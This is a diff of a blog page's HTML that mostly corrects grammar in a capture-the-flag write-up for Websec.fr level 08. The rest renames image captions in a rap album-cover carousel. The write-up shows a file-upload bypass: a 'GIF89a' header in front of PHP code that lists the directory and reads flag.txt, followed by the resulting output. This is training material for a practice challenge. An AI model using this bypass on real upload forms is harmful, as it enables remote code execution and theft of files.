@@ -218,7 +218,7 @@ document.addEventListener('DOMContentLoaded', function() {
         <h1>Websec.fr Level 08</h1>
     </header>
     <div class="content__body">
-        <p>The code source of <a href="http://websec.fr/level08/index.php">level8</a> is <a href="http://websec.fr/level08/source.php">here</a>.</p>
+        <p>The source code of <a href="http://websec.fr/level08/index.php">level8</a> is <a href="http://websec.fr/level08/source.php">here</a>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>$uploadedFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">sprintf</span>(<span style="color:#e6db74">&#39;%1$s/%2$s&#39;</span>, <span style="color:#e6db74">&#39;/uploads&#39;</span>, <span style="color:#a6e22e">sha1</span>($_FILES[<span style="color:#e6db74">&#39;fileToUpload&#39;</span>][<span style="color:#e6db74">&#39;name&#39;</span>]) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.gif&#39;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">file_exists</span> ($uploadedFile)) { <span style="color:#a6e22e">unlink</span> ($uploadedFile); }
@@ -235,16 +235,16 @@ document.addEventListener('DOMContentLoaded', function() {
 </span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;text-danger&#34;&gt;The file is not an image&lt;/p&gt;&#39;</span>; }
 </span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> { <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;&lt;p class=&#34;text-danger&#34;&gt;The file is too big&lt;/p&gt;&#39;</span>; }
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
-</span></span></span></code></pre></div><p>With this code we have 2 problem and that it&rsquo;s important to bypass are:</p>
+</span></span></span></code></pre></div><p>With this code we have 2 problems to bypass:</p>
 <ul>
 <li>The GIF header</li>
-<li>The size of file uploaded</li>
+<li>The size of the file uploaded</li>
 </ul>
-<p>For this type of vulnerability i use my mindmap
+<p>For this type of vulnerability I use my mindmap
 <img src="/images/stc/file_upload_finish.excalidraw.png" alt="alt text"></p>
 <p>So we can create a file containing this :</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">GIF89a</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">scandir</span>(<span style="color:#e6db74">&#39;./&#39;</span>)); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">;
-</span></span></span></code></pre></div><p>With <code>GIF89a</code> who is header of <strong>GIF</strong> file</p>
+</span></span></span></code></pre></div><p>With <code>GIF89a</code> which is the header of a <strong>GIF</strong> file</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>Dump of file.php:
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>GIF89aarray(7) {
@@ -264,7 +264,7 @@ document.addEventListener('DOMContentLoaded', function() {
 </span></span><span style="display:flex;"><span>  string(7) &#34;uploads&#34;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>;
-</span></span></code></pre></div><p>After scaning a dir we can <strong>cat</strong> a <code>flag.txt</code></p>
+</span></span></code></pre></div><p>After scanning the directory we can <strong>cat</strong> a <code>flag.txt</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">GIF89a</span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">var_dump</span>(<span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;./flag.txt&#39;</span>)); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">;
 </span></span></span></code></pre></div><p>and we have this result:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span>GIF89astring(35) &#34; WEBSEC{BypassingImageChecksToRCE}
@@ -570,11 +570,11 @@ document.addEventListener('DOMContentLoaded', function() {
         
             
             <div class="carousel-item" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; transition: opacity 1s ease-in-out;">
-                <img src="/images/Zushiboyz%20Merch/Deen%20Burbigo%20-%20OG%20SAN%20Vol.1.jpg" 
-                     alt="Deen Burbigo - OG SAN Vol.1.jpg" 
+                <img src="/images/Zushiboyz%20Merch/Deen%20Burbigo%20-%20OG%20SAN%201.jpg" 
+                     alt="Deen Burbigo - OG SAN 1.jpg" 
                      style="width: 100%; height: 100%; object-fit: cover;">
                 <div style="position: absolute; bottom: 0; left: 0; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; padding: 8px 5px; text-align: center; font-size: 0.9rem; font-weight: bold;">
-                    Deen Burbigo - OG SAN Vol.1
+                    Deen Burbigo - OG SAN 1
                 </div>
             </div>
             
@@ -647,11 +647,11 @@ document.addEventListener('DOMContentLoaded', function() {
         
             
             <div class="carousel-item" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; transition: opacity 1s ease-in-out;">
-                <img src="/images/Zushiboyz%20Merch/HJeunecrack%20-%201ermouvement.jpg" 
-                     alt="HJeunecrack - 1ermouvement.jpg" 
+                <img src="/images/Zushiboyz%20Merch/HJeunecrack%20-%201er%20Mouvement.jpg" 
+                     alt="HJeunecrack - 1er Mouvement.jpg" 
                      style="width: 100%; height: 100%; object-fit: cover;">
                 <div style="position: absolute; bottom: 0; left: 0; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; padding: 8px 5px; text-align: center; font-size: 0.9rem; font-weight: bold;">
-                    HJeunecrack - 1ermouvement
+                    HJeunecrack - 1er Mouvement
                 </div>
             </div>
             
@@ -691,22 +691,22 @@ document.addEventListener('DOMContentLoaded', function() {
         
             
             <div class="carousel-item" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; transition: opacity 1s ease-in-out;">
-                <img src="/images/Zushiboyz%20Merch/Huntrill%20-%20Replica%202.jpeg" 
-                     alt="Huntrill - Replica 2.jpeg" 
+                <img src="/images/Zushiboyz%20Merch/Huntrill%20-%20LE%20BRUIT%20DE%20LA%20MACHINE%20A%20BILLETS%20.jpg" 
+                     alt="Huntrill - LE BRUIT DE LA MACHINE A BILLETS .jpg" 
                      style="width: 100%; height: 100%; object-fit: cover;">
                 <div style="position: absolute; bottom: 0; left: 0; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; padding: 8px 5px; text-align: center; font-size: 0.9rem; font-weight: bold;">
-                    Huntrill - Replica 2
+                    Huntrill - LE BRUIT DE LA MACHINE A BILLETS 
                 </div>
             </div>
             
         
             
             <div class="carousel-item" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; transition: opacity 1s ease-in-out;">
-                <img src="/images/Zushiboyz%20Merch/Huntrilll%20-%20LE%20BRUIT%20DE%20LA%20MACHINE%20A%20BILLETS%20.jpg" 
-                     alt="Huntrilll - LE BRUIT DE LA MACHINE A BILLETS .jpg" 
+                <img src="/images/Zushiboyz%20Merch/Huntrill%20-%20Replica%202.jpeg" 
+                     alt="Huntrill - Replica 2.jpeg" 
                      style="width: 100%; height: 100%; object-fit: cover;">
                 <div style="position: absolute; bottom: 0; left: 0; width: 100%; background: rgba(0, 0, 0, 0.6); color: #fff; padding: 8px 5px; text-align: center; font-size: 0.9rem; font-weight: bold;">
-                    Huntrilll - LE BRUIT DE LA MACHINE A BILLETS 
+                    Huntrill - Replica 2
                 </div>
             </div>
             
